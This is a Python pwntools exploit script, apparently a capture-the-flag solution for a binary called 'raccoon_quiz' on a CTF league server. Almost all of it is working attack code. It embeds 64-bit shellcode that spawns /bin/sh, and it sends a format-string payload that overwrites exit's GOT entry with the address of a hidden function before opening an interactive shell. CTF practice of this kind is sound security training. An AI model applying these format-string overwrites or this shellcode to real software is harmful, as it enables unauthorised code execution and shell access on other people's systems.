#!/usr/bin/env python3

import os
import sys
from pwn import *
from pwnlib.fmtstr import fmtstr_payload

context(arch='amd64', os='linux', endian='little', log_level='info')
context.terminal = ["tmux", "splitw", "-h"]

# set your target binary name here
binary_name = './raccoon_quiz'
gdb_command = ''
shellcode_64_nonzero = 'jlX\x0f\x05H\x89\xc7H\x89\xc6jrX\x0f\x05H\xbb//bin/shH1\xc0PSH\x89\xe7H\x89\xc6H\x89\xc2j;X\x0f\x05'

# setup debug binary
debug_name = binary_name[:-1] + 'x'
if not os.path.exists(debug_name):
    os.system("cp %s %s" % (binary_name, debug_name))


is_debug = False
# run program
if '--debug' in sys.argv:
    is_debug = True

if is_debug:
    p = process(debug_name)
    gdb.attach(p)
    raw_input("Press ENTER to continue to execute the program...")
else:
    # p = process(binary_name)
    p = remote("chal.ctf-league.osusec.org", 4816)


## write your exploit here
p.sendline("A")
p.sendline("B")
p.sendline("A")
# ask for the leadername
# p.sendline(b'AAAABBBB %6$p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p')
# print(p.recv())


exit_plt = 0x602050
super_sneaky_function = 0x400747
p.sendline(fmtstr_payload(6, {exit_plt: super_sneaky_function}))
# print(p.recv())

p.interactive()